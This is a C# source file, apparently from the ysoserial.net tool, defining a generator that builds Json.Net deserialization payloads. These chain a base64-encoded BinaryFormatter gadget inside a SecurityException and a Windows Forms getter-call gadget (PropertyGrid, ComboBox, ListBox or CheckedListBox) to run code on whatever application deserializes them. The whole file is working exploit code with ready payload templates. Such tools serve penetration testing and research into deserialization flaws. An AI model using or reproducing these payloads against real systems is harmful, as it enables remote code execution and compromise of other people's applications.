using NDesk.Options;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using System.Security.Principal;
using System.Windows.Markup;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    public class GetterSecurityExceptionGenerator : GenericGenerator
    {
        // SecurityException + Getter call gadget
        // SecurityException.get_Method leads to the BinaryFormatter.Deserialize

        // We can deserialize the SecurityException and set a proper Method member when serializer supports Serializable interface
        // Then, we can call the get_PropertyValue with one of the getter-call gadgets:
        // PropertyGrid
        // ComboBox
        // ListBox
        // CheckedListBox

        private int variant_number = 1; // Default

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "Json.Net" }; 
        }

        public override string Name()
        {
            return "GetterSecurityException";
        }

        public override string Finders()
        {
            return "Piotr Bazydlo";
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Variant number. Variant defines a different getter-call gadget. Choices: \r\n1 (default) - PropertyGrid getter-call gadget, " +
                "\r\n2 - ComboBox getter-call gadget (may execute code twice)" +
                "\r\n3 - ListBox getter-call gadget" +
                "\r\n4 - CheckedListBox getter-call gadget", v => int.TryParse(v, out variant_number) },
            };

            return options;
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.GetterChainAndDerived };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                IGenerator generator = new TypeConfuseDelegateGenerator();
                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            string payload = "";
            string sePayload = @"{
            '$type':'System.Security.SecurityException',
            'ClassName':'System.Security.SecurityException',
            'Message':'Security error.',
            'InnerException':null,
            'HelpURL':null,
            'StackTraceString':null,
            'RemoteStackTraceString':null,
            'RemoteStackIndex':0,
            'ExceptionMethod':null,
            'HResult':-2146233078,
            'Source':null,
            'Action':0,
            'Method':'" + b64encoded + @"',
            'Zone':0
        }";

            if (formatter.ToLower().Equals("json.net"))
            {
                if (variant_number == 2)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.ComboBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + sePayload + @"
    ], 
    'DisplayMember':'Method',
    'Text':'watever'
}";
                }
                else if (variant_number == 3)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.ListBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + sePayload + @"
    ], 
    'DisplayMember':'Method',
    'Text':'watever'
}";
                }
                else if (variant_number == 4)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.CheckedListBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + sePayload + @"
    ], 
    'DisplayMember':'Method',
    'Text':'watever'
}";
                }
                else
                {
                    payload = @"{
    '$type':'System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'SelectedObjects':[
        " + sePayload + @"
    ]
}";
                }

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = JsonHelper.Minify(payload, new string[] { "mscorlib" }, null);
                    }
                    else
                    {
                        payload = JsonHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }

}
